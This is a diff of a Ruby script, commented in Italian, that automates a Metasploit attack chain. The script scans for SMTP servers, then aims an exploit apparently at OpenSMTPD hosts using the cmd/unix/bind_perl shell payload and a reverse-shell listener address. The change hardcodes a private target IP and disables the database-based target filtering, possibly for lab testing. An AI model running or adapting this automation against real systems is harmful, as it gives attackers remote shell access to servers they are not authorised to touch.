@@ -70,6 +70,7 @@ end
 # Esegue processo di attacco
 #
 def execute_attack(workspace, targetIPs, listeningIP)
+    targetIPs="192.168.40.22"
     # si sposta nel workspace specificato come parametro,
     # se non esiste lo crea in automatico
     run_single("workspace -a #{workspace}")
@@ -89,7 +90,7 @@ def execute_attack(workspace, targetIPs, listeningIP)
     run_single("use auxiliary/scanner/smtp/smtp_version")
     # tra le macchine salvate nel db filtra tutte quelle con la porta 25 aperta
     # e le seleziona come obiettivo per lo scanner
-    run_single("services -p 25 -R")
+    #run_single("services -p 25 -R")
     # esegue scanner che raccoglie informazioni su che server smtp viene usato
     run_single("run")
 
@@ -101,7 +102,7 @@ def execute_attack(workspace, targetIPs, listeningIP)
     # run_single("set payload cmd/unix/reverse_openssl")
     run_single("set payload cmd/unix/bind_perl")
     # imposta come obiettivo dell'exploit tutti i server opensmtpd
-    run_single("services -S opensmtpd -R")
+    #run_single("services -S opensmtpd -R")
     # imposta l'indirizzo ip su cui avviare il listener per la reverse shell
     run_single("set LHOST #{listeningIP}")
     # COMPATIBILITY MOD
